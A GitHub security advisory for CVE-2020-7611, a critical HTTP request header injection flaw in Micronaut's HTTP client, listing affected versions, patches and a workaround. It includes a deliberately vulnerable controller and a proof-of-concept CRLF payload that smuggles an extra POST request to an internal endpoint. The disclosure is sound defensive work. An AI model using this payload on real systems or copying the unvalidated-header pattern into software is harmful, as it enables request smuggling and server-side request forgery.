# [C] Micronaut's HTTP client is vulnerable to HTTP Request Header Injection

## Summary
Severity: Critical
Advisory: GHSA-694p-xrhg-x3wm
CVE: CVE-2020-7611
CWE: CWE-444
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2020-03-30
Source: https://github.com/advisories/GHSA-694p-xrhg-x3wm
Type: github-advisory

## Affected
- Maven: `io.micronaut:micronaut-http-client` — affected >=0 <1.2.11
- Maven: `io.micronaut:micronaut-http-client` — affected >=1.3.0 <1.3.2

## Details
### Vulnerability

Micronaut's HTTP client is vulnerable to "HTTP Request Header Injection" due to not validating request headers passed to the client.

Example of vulnerable code:

```java
@Controller("/hello")
public class HelloController {

    @Inject
    @Client("/")
    RxHttpClient client;

    @Get("/external-exploit")
    @Produces(MediaType.TEXT_PLAIN)
    public String externalExploit(@QueryValue("header-value") String headerValue) {
        return client.toBlocking().retrieve(
            HttpRequest.GET("/hello")
                .header("Test", headerValue)
        );
    }
}
```

In the above case a query value received from a user is passed as a header value to the client. Since the client doesn't validate the header value the request headers and body have the potential to be manipulated.

For example, a user that supplies the following payload, can force the client to make multiple attacker-controlled HTTP requests.

```java
List<String> headerData = List.of(
    "Connection: Keep-Alive", // This keeps the connection open so another request can be stuffed in.
    "",
    "",
    "POST /hello/super-secret HTTP/1.1",
    "Host: 127.0.0.1",
    "Content-Length: 31",
    "",
    "{\"new\":\"json\",\"content\":\"here\"}",
    "",
    ""
);
String headerValue = "H\r\n" + String.join("\r\n", headerData);;
URI theURI =
    UriBuilder
        .of("/hello/external-exploit")
        .queryParam("header-value", headerValue) // Automatically URL encodes data
        .build();
HttpRequest<String> request = HttpRequest.GET(theURI);
String body = client.toBlocking().retrieve(request);
```

Note that using `@HeaderValue` instead of `@QueryValue` is not vulnerable since Micronaut's HTTP server does validate the headers passed to the server, so the exploit can only be triggered by using user data that is not an HTTP header (query values, form data etc.).

### Impact

The attacker is able to control the entirety of the HTTP body for their custom requests.
As such, this vulnerability enables attackers to perform a variant of [Server Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html).

### Patches

The problem has been patched in the `micronaut-http-client` versions 1.2.11 and 1.3.2 and above.

### Workarounds

Do not pass user data directly received from HTTP request parameters as headers in the HTTP client.

### References

Fix commits
- https://github.com/micronaut-projects/micronaut-core/commit/9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1
- https://github.com/micronaut-projects/micronaut-core/commit/6deb60b75517f80c57b42d935f07955c773b766d
- https://github.com/micronaut-projects/micronaut-core/commit/bc855e439c4a5ced3d83195bb59d0679cbd95add

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [micronaut-core](https://github.com/micronaut-projects/micronaut-core)
* Email us at [info@micronaut.io](mailto:info@micronaut.io)

### Credit

Originally reported by @JLLeitschuh

## References
- https://github.com/micronaut-projects/micronaut-core/security/advisories/GHSA-694p-xrhg-x3wm
- https://nvd.nist.gov/vuln/detail/CVE-2020-7611
- https://github.com/micronaut-projects/micronaut-core/commit/6deb60b75517f80c57b42d935f07955c773b766d
- https://github.com/micronaut-projects/micronaut-core/commit/9d1eff5c8df1d6cda1fe00ef046729b2a6abe7f1
- https://github.com/micronaut-projects/micronaut-core/commit/bc855e439c4a5ced3d83195bb59d0679cbd95add
- https://github.com/micronaut-projects/micronaut-core
- https://snyk.io/vuln/SNYK-JAVA-IOMICRONAUT-561342
